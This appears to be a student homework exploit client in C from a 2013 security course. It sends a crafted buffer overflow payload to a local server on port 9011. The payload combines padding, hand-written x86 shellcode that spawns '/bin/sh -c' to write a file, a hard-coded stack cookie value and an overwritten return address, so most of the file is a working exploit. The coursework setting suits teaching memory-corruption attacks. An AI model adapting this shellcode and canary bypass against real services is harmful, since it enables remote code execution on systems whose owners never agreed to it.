/* file: clien2.c class: 18-732, Spring 2013 assignment: Homework 1
*/

/* Obligatory includes */


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <sys/time.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/uio.h>
#include <stdarg.h>
#include <errno.h>



int main(int argc, char** argv)
{
  char reqstring[1000] = "1|"
"echo I win! > bar.txt -c /bin/sh " // 33 bytes
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" //63 bytes, 96 bytes total
"\x31\xc0\x83\xc0\x4b\xc1\xe0\x02\x29\xc4\x89\xe0\x83\xc0\x05\x8a\x18\x80\xc3\x18\x88\x18\x83\xc0\x10\x8a\x18\x80\xeb\x20\x88\x18\x83\xc0\x03\x8a\x18\x80\xeb\x20\x88\x18\x83\xc0\x08\x8a\x18\x80\xeb\x20\x88\x18\x89\xe3\x31\xc0\x50\x89\xe2\x89\xd8\x50\x83\xc0\x16\x50\x83\xc0\x03\x50\x8b\x1c\x24\x89\xe1\x31\xc0\xb0\x0b\xcd\x80         " //90 bytes, 186 bytes total
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" //90 bytes, 276 bytes total
"\x94\x35\xc6\x55" // 4 bytes cookie
"aaaaaaaaaaaaaaaa" // 16 bytes junk, 296 bytes total
"\xbc\x4c\x48\x55"; //jump 200 bytes down

	int PORTNUM;
	char SERVER_IP[16];
    
	int sock, nbytes, i, total, s;
	char request[1000];
	char recvline[1000];
	struct sockaddr_in srv;
 
	/* Set up some defaults for if you don't enter any parameters */ 
	PORTNUM = 9011;
	strcpy(SERVER_IP, "127.0.0.1");	

    printf("\nUsage: client [-port <port_number>] [-server <server_IP>]\n");
        
	/* Process command line switches */
	/* Usage: client [-port <port_number>] [-server <server_IP>] */
	for(i = 1; i < argc; i++){
		if(argv[i][0] == '-'){
			if(strcmp(argv[i], "-port") == 0){
				PORTNUM = atoi(argv[++i]);
			}else if(strcmp(argv[i], "-server") == 0){
				strncpy(SERVER_IP, argv[++i],16);
		 }else{
				printf("Unknown switch \"%s\"\n", argv[i]);
				exit(1);
			}
		}else{
			printf("Unknown switch \"%s\"\n", argv[i]);
			exit(1);
		}
	}

	/* Fill in the server data structure */
	memset(&srv, 0, sizeof(srv));
	srv.sin_family = AF_INET;
	srv.sin_port = htons(PORTNUM);
	srv.sin_addr.s_addr = inet_addr(SERVER_IP);

	/* Create the socket */
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		perror("socket");
		exit(1);
	}

        printf("\nConnecting to %s:%u\n", SERVER_IP, PORTNUM);

	/* Connect to the socket */
	if(connect(sock, (struct sockaddr*) &srv, sizeof(srv)) < 0){
		perror("connect");
		exit(1);
	}

	printf("The request is:\n%s\n", reqstring); 

	/* Make the request */
	strncpy(request, reqstring,1000 ); 
	total = 0;
	s = strlen(request);
	while( total < s){
		nbytes = write(sock, request + total, s);
		total = total + nbytes;
	} 

        printf("The response of the server is:\n");	

	/* Get and output the response */
	nbytes = 0;
	while( (nbytes = read(sock, recvline, 1000)) > 0){
		recvline[nbytes] = 0;
		printf("%s\n", recvline); 
	}

	

	return(0);
}

